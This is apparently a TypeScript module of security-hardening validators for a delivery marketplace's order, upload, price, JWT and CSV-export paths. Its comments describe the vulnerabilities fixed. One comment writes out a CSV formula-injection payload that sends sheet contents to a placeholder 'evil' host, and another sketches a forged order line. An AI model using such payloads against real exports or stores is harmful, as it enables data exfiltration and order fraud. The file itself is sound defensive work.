// ── Order input validation ──────────────────────────────────────────────────
// Pure helpers for the untrusted numbers that arrive on POST /api/orders. They
// live here rather than inline in routes.ts so they can be unit-tested directly;
// routes.ts exports only registerRoutes.

// ── Upload content-type allowlist ───────────────────────────────────────────
// The disk uploader had NO fileFilter and both uploaders propagated the client's
// own Content-Type and filename extension. An `evil.html` uploaded through
// POST /api/upload landed in /uploads/, which is served from the app's own origin
// with `Access-Control-Allow-Origin: *` — stored XSS on the app origin, outside
// the /admin-only CSP. Extension and content type are now derived from this map,
// never from anything the client sent.
export const ALLOWED_IMAGE_MIME: Readonly<Record<string, string>> = {
  "image/jpeg": ".jpg",
  "image/png": ".png",
  "image/webp": ".webp",
  "image/gif": ".gif",
  "image/heic": ".heic",
};

export function isAllowedImageMime(mime: string | undefined): boolean {
  return (
    !!mime &&
    Object.prototype.hasOwnProperty.call(ALLOWED_IMAGE_MIME, mime.toLowerCase())
  );
}

/** Safe file extension for an upload — from the allowlist, never from the filename. */
export function safeImageExtension(mime: string | undefined): string {
  return ALLOWED_IMAGE_MIME[String(mime).toLowerCase()] ?? ".jpg";
}

/** Content type to store/serve with. Never echo the client's value back. */
export function safeImageContentType(mime: string | undefined): string {
  return isAllowedImageMime(mime) ? String(mime).toLowerCase() : "image/jpeg";
}

/**
 * Detect an image type from the file's own magic bytes, ignoring whatever the
 * client claimed. Returns null when the bytes are not one of the supported
 * formats — including for `text/html`, which is the payload that mattered.
 *
 * React Native's FormData sends `application/octet-stream` for perfectly valid
 * photos on some devices, so the declared MIME cannot be trusted in either
 * direction: rejecting octet-stream breaks real uploads, accepting it blindly
 * lets anything through. The bytes settle it.
 */
export function sniffImageMime(
  buffer: Buffer | Uint8Array | undefined,
): string | null {
  if (!buffer || buffer.length < 12) return null;
  const b = buffer;
  // JPEG: FF D8 FF
  if (b[0] === 0xff && b[1] === 0xd8 && b[2] === 0xff) return "image/jpeg";
  // PNG: 89 50 4E 47 0D 0A 1A 0A
  if (b[0] === 0x89 && b[1] === 0x50 && b[2] === 0x4e && b[3] === 0x47)
    return "image/png";
  // GIF: "GIF8"
  if (b[0] === 0x47 && b[1] === 0x49 && b[2] === 0x46 && b[3] === 0x38)
    return "image/gif";
  const ascii = (start: number, end: number) =>
    Buffer.from(b.slice(start, end)).toString("latin1");
  // RIFF....WEBP
  if (ascii(0, 4) === "RIFF" && ascii(8, 12) === "WEBP") return "image/webp";
  // ....ftypheic / ftypheix / ftypmif1  (HEIC family)
  if (
    ascii(4, 8) === "ftyp" &&
    /^(heic|heix|hevc|mif1|msf1)/.test(ascii(8, 12))
  )
    return "image/heic";
  return null;
}

/**
 * Byte budget for inline item images inside one order document.
 *
 * Firestore rejects any document larger than 1,048,576 bytes. Marketplace product
 * images are Base64 data URIs of roughly 40-80KB each, copied verbatim from the
 * cart into `orderData.items`, so a cart of ~8-15 items pushed the write past the
 * limit — POST /api/orders then failed for that cart, permanently, with no way for
 * the customer to recover except emptying the basket. 700KB leaves comfortable room
 * for the rest of the document (address, notes, item names, pricing, timestamps).
 */
export const ORDER_IMAGE_BYTE_BUDGET = 700_000;

/**
 * Return a copy of `items` whose inline images fit inside the budget.
 *
 * Images are kept in order until the budget is spent; every later one is dropped
 * to "". `productId` stays on every item, so any screen that needs the picture can
 * still resolve it from the catalog. Small carts — the overwhelming majority — are
 * returned completely untouched.
 */
export function capOrderItemImages<T extends Record<string, any>>(
  items: T[],
  budget: number = ORDER_IMAGE_BYTE_BUDGET,
): T[] {
  if (!Array.isArray(items)) return items;
  let spent = 0;
  return items.map((item) => {
    const image = typeof item?.image === "string" ? item.image : "";
    if (!image) return item;
    if (spent + image.length <= budget) {
      spent += image.length;
      return item;
    }
    return { ...item, image: "" };
  });
}

/**
 * Is a cached image value safe to hand back instead of re-uploading?
 *
 * Only a real Firebase Storage URL is. `/uploads/...` points at the VM's ephemeral
 * disk and a `data:` blob belongs in Storage, not in a Firestore document — reusing
 * either propagates a legacy value onto a brand-new record.
 */
export function isUsableCachedImage(url: unknown): boolean {
  return (
    typeof url === "string" &&
    url.startsWith("https://firebasestorage.googleapis.com/")
  );
}

/** Highest quantity a single cart line may carry. Above this it is a mistake or an attack. */
export const MAX_ITEM_QUANTITY = 99;

/**
 * Coerce a client-supplied cart quantity into a safe positive integer.
 *
 * `Number(it.quantity) || 1` accepted anything: `-5` produced a negative line
 * total that cancelled out the rest of the cart (free order), and `"1e999"`
 * became `Infinity`, which propagated through the order total into the
 * settlement ledger and permanently poisoned that account — `Infinity` is not
 * recoverable by any later arithmetic.
 *
 * Anything not a finite number ≥ 1 falls back to 1, which is what the previous
 * `|| 1` did for the ordinary "missing quantity" case, so honest carts are
 * unaffected.
 */
export function sanitizeQuantity(raw: unknown): number {
  const n = Number(raw);
  if (!Number.isFinite(n)) return 1;
  const floored = Math.floor(n);
  if (floored < 1) return 1;
  return Math.min(floored, MAX_ITEM_QUANTITY);
}

// ── Stored order lines (H-66) ───────────────────────────────────────────────
//
// `orderData.items` was the client's own array, passed through `capOrderItemImages`
// — which only trims oversized inline images. Everything else on every line was
// whatever the app posted: `name`, `price`, `quantity`, the variant label, and the
// add-on names and prices.
//
// The order TOTAL was never at risk: it is recomputed from the catalogue, and a
// per-line price that disagrees by more than 1 IQD is rejected outright. But the
// total is not what the store reads. The vendor screen, the driver's item list,
// the admin order view and the printed receipt all render `items[]`, so a caller
// could post
//
//     { productId: "<a real product>", name: "عيّنة مجانية", price: <the real price> }
//
// and be charged correctly while the store prepared and handed over a line that
// says something else entirely. Quantity was worse than cosmetic: the subtotal
// used `sanitizeQuantity(it.quantity)` while the stored line kept the raw value,
// so a line priced as 1 could be stored — and picked, packed and delivered — as
// 99, or as `-5`, or as `1e999`.
//
// The fix is to stop storing the client's array at all. Every field below is
// re-derived from the same catalogue document the price was verified against, so
// what is stored is what the server itself resolved. Fields the client sends that
// are not in this shape are dropped rather than persisted.
//
// This does not touch orders already in Firestore; it only changes what new ones
// are written with.

/** One add-on as it is stored on an order line — resolved from the product, not the cart. */
export interface StoredOrderAddon {
  id: string;
  name: string;
  price: number;
}

/** One order line as it is stored on the order document. */
export interface StoredOrderItem {
  productId: string;
  name: string;
  price: number;
  quantity: number;
  image?: string;
  restaurant?: string;
  selectedVariantId?: string;
  variantName?: string;
  variantPriceAdjustment?: number;
  selectedAddons?: StoredOrderAddon[];
}

/**
 * Everything the route resolved for one line, straight from the catalogue.
 *
 * `unitPrice` is the fully-adjusted verified price for this line — base plus the
 * variant adjustment plus the add-ons — i.e. exactly the number that went into
 * `verifiedSubtotal`. Passing it in rather than recomputing it here keeps one
 * definition of the price.
 */
export interface ResolvedOrderLine {
  productId: string;
  name: unknown;
  unitPrice: number;
  quantity: unknown;
  image?: unknown;
  restaurant?: unknown;
  variant?: { id?: unknown; name?: unknown; priceAdjustment?: unknown } | null;
  addons?: { id?: unknown; name?: unknown; price?: unknown }[];
}

/** A trimmed string, or "" for anything that is not usable text. */
function text(value: unknown): string {
  return typeof value === "string" ? value.trim() : "";
}

/** A finite number, or `fallback`. Never NaN, never ±Infinity. */
function finite(value: unknown, fallback = 0): number {
  const n = typeof value === "number" ? value : Number(value);
  return Number.isFinite(n) ? n : fallback;
}

/**
 * Build the line to persist from what the server resolved.
 *
 * Optional keys are omitted rather than set to `undefined`: Firestore rejects a
 * document containing an undefined value, and an order that fails to write is a
 * failed checkout. Omitting also keeps the stored shape identical to what the
 * honest client used to produce, so every existing reader is unaffected.
 */
export function buildStoredOrderItem(line: ResolvedOrderLine): StoredOrderItem {
  const stored: StoredOrderItem = {
    productId: line.productId,
    name: text(line.name),
    price: finite(line.unitPrice),
    quantity: sanitizeQuantity(line.quantity),
  };

  const image = text(line.image);
  if (image) stored.image = image;

  const restaurant = text(line.restaurant);
  if (restaurant) stored.restaurant = restaurant;

  // The variant is stored only when the catalogue actually matched one. A
  // `selectedVariantId` the product does not define contributed nothing to the
  // verified price, so persisting its client-supplied label would describe a
  // choice the order was not priced for.
  if (line.variant) {
    const id = text(line.variant.id);
    if (id) {
      stored.selectedVariantId = id;
      stored.variantName = text(line.variant.name);
      stored.variantPriceAdjustment = finite(line.variant.priceAdjustment);
    }
  }

  // Same rule for add-ons: only the ones the product defines, priced as the
  // product prices them.
  if (Array.isArray(line.addons) && line.addons.length > 0) {
    const addons = line.addons
      .map((a) => ({
        id: text(a?.id),
        name: text(a?.name),
        price: finite(a?.price),
      }))
      .filter((a) => a.id !== "");
    if (addons.length > 0) stored.selectedAddons = addons;
  }

  return stored;
}

// ── Order address, notes, type and coordinates (H-67) ───────────────────────
//
// `POST /api/orders` destructured `address`, `notes`, `orderType`, `latitude` and
// `longitude` from the body and wrote them onto the order document unchanged. The
// admin vendor route in the same file already validated coordinates with a local
// `clampCoord`; the order route — the one a customer can reach — did not.
//
// Coordinates were the sharp edge. A JSON body cannot carry a `NaN` literal, but
// it can carry `1e309`, and `JSON.parse` turns that into `Infinity`, which is a
// `number`:
//
//     JSON.parse('{"latitude":1e309}')      →  { latitude: Infinity }
//     typeof Infinity === "number"          →  true
//
// Both distance call sites gate on `typeof … === "number"`, so `Infinity` walks
// straight through into the haversine and every term collapses:
//
//     calculateDistance(33.2, 44.3, Infinity, -Infinity)  →  NaN
//
// A NaN distance then propagates into `ordersCombinable` (which decides whether
// two drops share a trip) and into `cands.sort((a, b) => a.dist - b.dist)`, where
// NaN comparisons make the sort order undefined — so the "nearest" driver picked
// for a top-up is arbitrary. An in-range-typed but geographically impossible value
// like `999` is quieter and just as wrong: it produces a finite 14,239 km.
//
// The value is also stored, so it is what the driver's map and the admin tracking
// view read back as the customer's authoritative location.
//
// These helpers are the single definition of that validation. The admin vendor
// route now calls the same `parseCoordinate` its local copy used to implement.

/** Valid latitude bounds, in degrees. */
export const LATITUDE_MIN = -90;
export const LATITUDE_MAX = 90;
/** Valid longitude bounds, in degrees. */
export const LONGITUDE_MIN = -180;
export const LONGITUDE_MAX = 180;

/**
 * Was this optional field supplied at all?
 *
 * `undefined` means the key was absent — the customer did not drop a pin, did not
 * type a note. `null` and `""` are the "cleared" spellings a form sends. Anything
 * else is an attempt to supply a value, and must therefore be a usable one.
 *
 * One definition, used for every optional order field, so "absent" and "invalid"
 * are told apart the same way everywhere.
 */
export function isProvided(value: unknown): boolean {
  return value !== undefined && value !== null && value !== "";
}

/**
 * A coordinate as a finite number inside its range, or `null`.
 *
 * `null` covers all of: absent, cleared, non-numeric, NaN, ±Infinity, and out of
 * range. Callers decide what `null` means for them — the admin vendor route stores
 * it (clearing the pin), the order route rejects the request.
 */
export function parseCoordinate(
  value: unknown,
  min: number,
  max: number,
): number | null {
  if (!isProvided(value)) return null;
  // Only a number or a numeric string is a coordinate. Both private copies of this
  // check went straight to `Number(v)`, and `Number` is far too willing: `Number([])`
  // is 0 and `Number(true)` is 1, so a posted `latitude: []` passed every later test
  // and was stored as the equator.
  if (typeof value !== "number" && typeof value !== "string") return null;
  const n = typeof value === "number" ? value : Number(value.trim());
  if (!Number.isFinite(n)) return null;
  if (n < min || n > max) return null;
  return n;
}

/** Latitude in [-90, 90], or null. */
export function parseLatitude(value: unknown): number | null {
  return parseCoordinate(value, LATITUDE_MIN, LATITUDE_MAX);
}

/** Longitude in [-180, 180], or null. */
export function parseLongitude(value: unknown): number | null {
  return parseCoordinate(value, LONGITUDE_MIN, LONGITUDE_MAX);
}

/**
 * Longest address and note this project will store on an order.
 *
 * Both are display fields. The client composes an address as
 * "area - detail (landmark)", which runs to a couple of hundred characters at the
 * very most, so these bounds cannot truncate a real one — they exist so that an
 * unbounded string cannot be pushed into the document alongside the item images
 * that already budget 700KB of its 1MB limit.
 */
export const MAX_ORDER_ADDRESS_LENGTH = 500;
export const MAX_ORDER_NOTES_LENGTH = 1000;

/**
 * A free-text order field, normalised for storage.
 *
 * Anything that is not a string becomes "" rather than being stored as-is: an
 * object posted as `address` used to reach Firestore as a map, and every screen
 * that renders it — the driver's delivery card, the admin order view, the printed
 * receipt — would show `[object Object]` instead of somewhere to drive to.
 *
 * Over-long values are truncated rather than rejected. Rejecting would add a new
 * way for a checkout to fail, and these are display fields; the bound is far above
 * any genuine address, so in practice nothing is ever cut.
 */
export function normalizeOrderText(value: unknown, maxLength: number): string {
  if (typeof value !== "string") return "";
  return value.trim().slice(0, maxLength);
}

/**
 * The order kinds a client may tag an order with.
 *
 * `courier-pickup` and `international-shopping` are what the two special-request
 * screens send. `delivery` and `restaurant` are read by shipped code — the driver's
 * order badge and the admin order lists — so they stay accepted for any build still
 * sending them.
 *
 * This tag does NOT decide pricing. Since D-3 every order freezes `orderKind`, and
 * `checkIsRestaurantOrder` reads that first and returns before it ever looks at
 * `orderType`, so nothing here can move the app/driver split.
 */
export const ORDER_TYPES: readonly string[] = [
  "delivery",
  "restaurant",
  "courier-pickup",
  "international-shopping",
];

/**
 * The order tag to store, or `null` when the value is not one this project uses.
 *
 * `null` means "not storable". It does not distinguish absent from unrecognised —
 * `validateOrderFields` makes that distinction, because only the caller knows that
 * an absent tag is fine and a wrong one is an error.
 */
export function normalizeOrderType(value: unknown): string | null {
  if (typeof value !== "string") return null;
  const trimmed = value.trim();
  return ORDER_TYPES.includes(trimmed) ? trimmed : null;
}

// ── The order path's single field validator ─────────────────────────────────
//
// The route used to call four helpers inline and assemble the result itself,
// which is how the raw body values stayed in scope next to the validated ones and
// could be stored by mistake. Everything the order write needs now comes out of
// one call, and the raw values are not used again.

/** The five request fields H-67 governs. */
export interface OrderFieldsInput {
  address: unknown;
  notes: unknown;
  orderType: unknown;
  latitude: unknown;
  longitude: unknown;
}

/** What the order document is written from. Coordinates are both set, or both null. */
export interface ValidatedOrderFields {
  address: string;
  notes: string;
  orderType: string | null;
  latitude: number | null;
  longitude: number | null;
}

export type OrderFieldsResult =
  | { ok: true; value: ValidatedOrderFields }
  | { ok: false; error: string };

/**
 * Validate and normalise the order's own fields.
 *
 * Optional means optional: an absent pin, note or tag is not an error, because
 * most orders are placed without them. Supplying one and getting it wrong is an
 * error, and the request is refused rather than the bad value being stored.
 *
 * Coordinates are a pair. The client derives both from a single map selection, so
 * half a pair is malformed rather than a partial answer, and a rejected pair fails
 * the request instead of silently reaching the driver's map and the haversine that
 * groups drops into trips.
 *
 * Nothing here touches money. `orderType` is a display tag; the pricing decision is
 * `orderKind`, frozen separately at checkout by D-3, and `checkIsRestaurantOrder`
 * reads that first and returns before it ever looks at `orderType`.
 */
export function validateOrderFields(
  input: OrderFieldsInput,
): OrderFieldsResult {
  const latProvided = isProvided(input.latitude);
  const lngProvided = isProvided(input.longitude);
  const latitude = parseLatitude(input.latitude);
  const longitude = parseLongitude(input.longitude);
  if (
    (latProvided || lngProvided) &&
    (latitude === null || longitude === null)
  ) {
    return {
      ok: false,
      error: "موقع التوصيل غير صالح، يرجى تحديد الموقع على الخريطة مرة أخرى",
    };
  }

  const orderType = normalizeOrderType(input.orderType);
  if (isProvided(input.orderType) && orderType === null) {
    return { ok: false, error: "نوع الطلب غير معروف" };
  }

  return {
    ok: true,
    value: {
      address: normalizeOrderText(input.address, MAX_ORDER_ADDRESS_LENGTH),
      notes: normalizeOrderText(input.notes, MAX_ORDER_NOTES_LENGTH),
      orderType,
      latitude,
      longitude,
    },
  };
}

// ── Driver document image limits (H-70) ─────────────────────────────────────
//
// `storeDriverDocument()` took a base64 data URI straight from the request body,
// turned it into a Buffer and ran a three-stage sharp pipeline on it —
// `.rotate().resize(1400,1400).webp()` — with no check on how big the image
// actually was once decoded. `POST /api/drivers` calls it up to three times per
// request (national id, residence card, licence).
//
// Compressed size is not a proxy for decode cost. Measured on this project's own
// sharp build, a solid-colour PNG of 8000×8000:
//
//     compressed        197 KB      (263 KB as base64 — fits any body limit)
//     decoded          64.0 MP  ->  192 MB of raw pixels
//     metadata() cost     1 ms      (header only — it never decodes)
//
// sharp does carry a default ceiling, but it is `0x3FFF × 0x3FFF` = 268 MP, i.e.
// about 1.07 GB of raw pixels — far above anything this app has a use for, and it
// only fires once processing has already begun, surfacing as a generic failure.
// So the 64 MP bomb above was processed in full today, three times per request.
//
// The fix is to read the header first — which costs a millisecond — and refuse
// before any decode. These two bounds are deliberately independent: the byte bound
// caps what is copied into memory before sharp is handed anything at all, and the
// pixel bound caps what a decode would cost. Neither substitutes for the other,
// because the whole point of a decompression bomb is that the first number is
// small while the second is not.

/**
 * Largest decoded pixel count accepted for an identity document.
 *
 * 40 megapixels. The reasoning, in the order it matters:
 *
 *   • What the app actually sends is ≤ 1400×1400 = 1.96 MP. Since H-56 the client
 *     resizes through expo-image-manipulator before upload, and the server resizes
 *     to `fit: inside` 1400×1400 anyway — so nothing above that is even retained.
 *     This bound is 20× that.
 *   • The realistic worst case is an older build, or a direct API caller, posting
 *     an untouched phone photo. A 12 MP camera original (4032×3024) is 12.2 MP;
 *     this bound is 3.3× that and also clears 24 MP and 32 MP sensors.
 *   • It caps what a decode can cost: 40 MP is ~120 MB as RGB, ~160 MB as RGBA.
 *     Above that a single request holding three documents could exhaust a small
 *     VPS on its own.
 *   • It refuses the bomb class outright — the 64 MP example above is 1.6× over,
 *     and sharp's own 268 MP ceiling is 6.7× over.
 *
 * Chosen to be generous to real documents and hostile to nothing else. A legitimate
 * driver photographing an Iraqi national ID cannot reach it with any phone sold.
 */
export const MAX_DOCUMENT_PIXELS = 40_000_000;

/**
 * Largest decoded-from-base64 byte length accepted for one document.
 *
 * 8 MB. Express already caps the whole JSON body at 10 MB, and three documents
 * share that budget, so a real request cannot put more than ~2.5 MB of binary into
 * any single field. This bounds each document independently of that, before the
 * buffer is handed to sharp — a cheap guard on the copy itself, not a substitute
 * for the pixel bound.
 */
export const MAX_DOCUMENT_INPUT_BYTES = 8 * 1024 * 1024;

/** Why a document image was refused. Maps to a specific 4xx at the route. */
export type DocumentImageRejection =
  | "too-large-bytes"
  | "unreadable"
  | "too-many-pixels";

/**
 * Decide whether a decoded document image may be processed.
 *
 * Pure: it takes the numbers sharp reported and returns a verdict, so the rule can
 * be tested directly without decoding anything. `null` means "safe to process".
 *
 * `width`/`height` come from `sharp().metadata()`, which reads only the header.
 * They are optional there — a corrupt, truncated or unsupported file yields
 * `undefined` — and a missing or non-sensible dimension is refused rather than
 * assumed, because an image whose size cannot be established cannot be shown to be
 * within any limit.
 */
export function checkDocumentImageLimits(input: {
  bytes: number;
  width?: number | null;
  height?: number | null;
}): DocumentImageRejection | null {
  if (!Number.isFinite(input.bytes) || input.bytes <= 0) return "unreadable";
  if (input.bytes > MAX_DOCUMENT_INPUT_BYTES) return "too-large-bytes";

  const { width, height } = input;
  if (
    typeof width !== "number" ||
    typeof height !== "number" ||
    !Number.isFinite(width) ||
    !Number.isFinite(height) ||
    !Number.isInteger(width) ||
    !Number.isInteger(height) ||
    width <= 0 ||
    height <= 0
  ) {
    return "unreadable";
  }

  if (width * height > MAX_DOCUMENT_PIXELS) return "too-many-pixels";
  return null;
}

/** The HTTP status a rejection should be answered with. */
export function documentRejectionStatus(r: DocumentImageRejection): number {
  // 413 for "this is bigger than we accept", 400 for "this is not a usable image".
  return r === "unreadable" ? 400 : 413;
}

/**
 * The message shown to the driver. Deliberately says nothing about the file's
 * contents — these are government identity documents and the response is a log
 * line away from being recorded.
 */
export function documentRejectionMessage(r: DocumentImageRejection): string {
  if (r === "unreadable")
    return "تعذّرت قراءة صورة الوثيقة، يرجى التقاطها مجدداً";
  return "صورة الوثيقة كبيرة جداً، يرجى التقاط صورة أصغر";
}

// ── Server-error responses ──────────────────────────────────────────────────
/**
 * The message every route-local 5xx must return.
 *
 * 51 handlers in routes.ts and 2 in vendor.ts answered with `error.message`
 * verbatim. Because they build the response themselves, the hardened global error
 * handler in index.ts never runs for them, and raw Firestore internals reached
 * unauthenticated clients — project ids, collection names, and the
 * `https://console.firebase.google.com/...` index-creation URLs that name the exact
 * fields being queried.
 */
export const GENERIC_SERVER_ERROR = "حدث خطأ في الخادم";

// ── Product price / stock validation (H-05) ─────────────────────────────────
//
// Three product-write paths guarded the price with a bare truthiness check
// (`if (!price)` / `if (price)`) and then stored `parseFloat(price)` as-is:
//   • POST /api/vendor/products              (vendor create)
//   • PUT  /api/vendor/products/:id          (vendor update)
//   • POST /api/admin/vendors/:vendorId/products
//
// Truthiness rejects 0 and "" but happily passes "-50000", "abc" and "1e400".
// A stored negative price is then used verbatim when an order is priced
// (verifiedSubtotal += realPrice * quantity, with no lower bound), so a hidden
// product priced -500000 dragged a real 400,000 basket down to a total of 0 —
// free goods, and the books still balanced because no cash was ever recorded.
//
// The two admin paths that already validated used `isNaN(p) || p <= 0`. This
// helper keeps that meaning but uses Number.isFinite, which ALSO rejects
// Infinity (parseFloat("1e400") === Infinity, and isNaN(Infinity) is false).
//
// No maximum is imposed: the project defines no MAX_PRICE and inventing one here
// could reject legitimately expensive items.

/** A usable product price: finite and strictly positive. Rejects NaN/±Infinity/≤0. */
export function isValidProductPrice(value: unknown): boolean {
  const n = typeof value === "number" ? value : parseFloat(String(value ?? ""));
  return Number.isFinite(n) && n > 0;
}

/**
 * Parse a product price for storage, or null when it is not usable.
 * Callers reject the request on null — never silently substitute a value.
 */
export function parseProductPrice(value: unknown): number | null {
  const n = typeof value === "number" ? value : parseFloat(String(value ?? ""));
  return Number.isFinite(n) && n > 0 ? n : null;
}

/**
 * Normalise a stock count to a non-negative integer.
 *
 * Stock is not a money field, so an unusable value is coerced rather than
 * rejected — this preserves the existing `parseInt(stock) || 0` behaviour of the
 * create paths and extends it to the update path, where a bare `parseInt(stock)`
 * could persist NaN. Zero is legitimate (out of stock), unlike a zero price.
 */
export function normaliseStock(value: unknown): number {
  const n = typeof value === "number" ? value : parseInt(String(value ?? ""), 10);
  return Number.isFinite(n) && n > 0 ? Math.floor(n) : 0;
}

// ── Vendor commission percentage (H-06) ─────────────────────────────────────
//
// The same stored value was read three different ways:
//   `v.commissionPercent || 10`   → turns a contracted 0% into 10%
//   `v.commissionPercent ?? 10`   → correct
//   `v.commissionPercent ?? 0`    → the vendor's own wallet screen, so the store
//                                    saw 0% while settlement charged 10%
//
// A store signed at an introductory 0% had `commissionPercent: 0` written as 10 by
// POST /api/admin/vendors, and every restaurant order then stamped
// vendorCommissionAmount at 10% — the figure the settlement engine prefers over
// recomputing. The store was billed against a rate its own screen never showed.
//
// Writes are validated (an admin typo must not silently become 10%); reads fall
// back to the platform default so a missing field bills the same everywhere.

/** The platform's standard commission when a store has no rate of its own. */
export const DEFAULT_COMMISSION_PERCENT = 10;

/** A usable commission rate: finite and within [0, 100]. 0 is legitimate — 10 is not implied. */
export function isValidCommissionPercent(value: unknown): boolean {
  const n = typeof value === "number" ? value : parseFloat(String(value ?? ""));
  return Number.isFinite(n) && n >= 0 && n <= 100;
}

/**
 * The rate to bill a store at. Reads only — never use this to sanitise a write,
 * because it cannot distinguish "not set" from "set to something invalid".
 */
export function commissionPercentOf(
  value: unknown,
  fallback: number = DEFAULT_COMMISSION_PERCENT,
): number {
  const n = typeof value === "number" ? value : parseFloat(String(value ?? ""));
  return Number.isFinite(n) && n >= 0 && n <= 100 ? n : fallback;
}

// ── JWT verification hardening (H-09) ───────────────────────────────────────
//
// All four audiences — admin, customer, driver, vendor — are signed with the same
// JWT_SECRET, carry no `aud`/`iss`, and were verified with the algorithm left open.
// Role separation therefore rests entirely on each verifier remembering to check
// its own discriminator (`type: "admin"` / `role: "customer" | "driver" | "vendor"`).
// All 14 verify sites do check one today, and a guardrail test keeps it that way.
//
// Pinning the algorithm is the piece that does not depend on anyone remembering:
// it forbids the verifier from being talked into a different algorithm by the
// token's own header. jsonwebtoken 9 already rejects `alg: none`, so this is
// defence in depth rather than a live hole — but it costs nothing and every token
// the project issues is HS256 anyway, so no existing session is affected.
//
// NOT done here, deliberately: adding `aud` per audience, or a separate secret per
// audience. Either one invalidates every token already in circulation (customers
// and drivers hold 30-day tokens, vendors 7-day), i.e. it logs the whole user base
// out at deploy time. That is a release decision, not a code cleanup.

/** The only algorithm this project signs with. Never widen without a migration plan. */
export const JWT_ALGORITHMS = ["HS256"] as const;

/** Verify options shared by every jwt.verify() call in the server. */
export const JWT_VERIFY_OPTS = { algorithms: JWT_ALGORITHMS as unknown as ["HS256"] };

// ── CSV export safety (H-15) ────────────────────────────────────────────────
//
// The settlement export escaped double quotes in ONE cell (the name), which keeps
// the file's structure valid but does nothing about formula injection. A cell
// beginning with = + - @ (or a tab/CR that Excel trims down to one) is evaluated
// when the file is opened, and `accountName` is the store's own display name —
// attacker-controlled. A store called `=HYPERLINK("http://evil/"&A1&B1,"x")` runs
// on the supervisor's machine and can exfiltrate the whole sheet: every account,
// every outstanding balance.
//
// Two separate problems, so two separate fixes in one helper:
//   • prefix a single quote when the value opens with a formula trigger, which
//     Excel and LibreOffice both treat as "this cell is text";
//   • double every embedded quote and wrap the cell, so the structure holds.

/** Characters that make a spreadsheet treat the rest of the cell as a formula. */
const CSV_FORMULA_TRIGGERS = ["=", "+", "-", "@", "\t", "\r"];

/**
 * One CSV cell: neutralised against formula injection and safely quoted.
 * Apply to EVERY text cell — a single unescaped column is enough.
 */
export function csvCell(value: unknown): string {
  let s = value === null || value === undefined ? "" : String(value);
  // Leading whitespace is trimmed by spreadsheets before the trigger is read,
  // so " =cmd" is just as dangerous as "=cmd".
  if (CSV_FORMULA_TRIGGERS.some((c) => s.trimStart().startsWith(c))) s = `'${s}`;
  return `"${s.replace(/"/g, '""')}"`;
}

/** A numeric CSV cell — never quoted, never able to carry text. */
export function csvNumber(value: unknown): string {
  const n = Number(value);
  return String(Number.isFinite(n) ? n : 0);
}
